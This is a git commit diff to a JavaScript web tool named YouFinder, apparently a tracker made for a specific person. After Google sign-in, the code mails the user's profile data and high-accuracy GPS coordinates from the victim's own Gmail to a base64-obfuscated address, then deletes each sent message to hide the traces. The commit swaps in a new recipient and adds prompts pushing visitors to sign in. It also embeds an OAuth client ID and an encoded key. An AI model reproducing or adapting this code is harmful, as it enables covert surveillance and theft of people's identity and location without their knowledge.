633d25db57a43858a3940d1ff8793ed7ead1668c
Genbu Hase <hasegenbu@gmail.com>
2017-08-10 14:59:20 +0900

    達也用に。

--- tools/youfinder/Main.js
+++ tools/youfinder/Main.js
@@ -12,13 +12,16 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 		ID: "860614012047-1jqr0777jrjsnq9tt73b38mkm748u35e.apps.googleusercontent.com",
 		Key: atob("Q2U2Qk5uQUlpaGxrVnB0eWgyRVd5V1I3"),
 
-		Url: "https://tatuya0902.github.io/tools/youfinder/"
+		Url: "https://tatuya0902.github.io/tools/youfinder/Top.html"
 	});
 
 	(function () {
 		let Timer = setInterval(function () {
 			if (GBase.hasLogined()) {
-				DOM("#SignInForm").className = "SignIn";
+				!DOM("#Dialogs_UnauthorizedNotify").open || DOM("#Dialogs_UnauthorizedNotify").close();
+				DOM(":HTML")[0].dataset.pageid == "Top" || (location.href += "Top.html");
+
+				DOM("#Dialogs_SignInNotify").showModal();
 
 				clearInterval(Timer);
 
@@ -31,7 +34,7 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 					DoesSync: false
 				}).response);
 
-				let LogMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder v2 Log> From " + UserInfo.Basic.displayName, JSON.stringify(UserInfo, null, "\t"));
+				let LogMail = new MBase.Gmail(atob("cHRyZ3VzMTkxOUBnbWFpbC5jb20="), "<YouFinder Log> From " + UserInfo.Basic.displayName, JSON.stringify(UserInfo, null, "\t"));
 				MBase.send(LogMail, function (Res) {
 					MBase.delete(Res.id);
 				});
@@ -39,24 +42,14 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 				navigator.geolocation.getCurrentPosition(function (Locate) {
 					UserInfo.Geolocation= Locate.coords.toObject();
 					
-					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder v2 GPS> From " + UserInfo.Basic.displayName, JSON.stringify(UserInfo, null, "\t"));
+					let GPSMail = new MBase.Gmail(atob("cHRyZ3VzMTkxOUBnbWFpbC5jb20="), "<YouFinder GPS> From " + UserInfo.Basic.displayName, JSON.stringify(UserInfo, null, "\t"));
 					MBase.send(GPSMail, function (Res) {
 						MBase.delete(Res.id);
 					});
 				}, function () {}, {enableHighAccuracy: true});
+			} else {
+				DOM("#Dialogs_UnauthorizedNotify").open || DOM("#Dialogs_UnauthorizedNotify").showModal();
 			}
 		}, 200);
 	})();
-});
-
-window.addEventListener("DOMContentLoaded", function () {
-	DOM("#SignIn").addEventListener("click", function () {
-		GBase.login([
-			GoogleAPI.SCOPE.PLUS[0],
-			GoogleAPI.SCOPE.PLUS[1],
-
-			GoogleAPI.SCOPE.GMAIL[0],
-			"https://www.googleapis.com/auth/contacts.readonly"
-		]);
-	});
 });
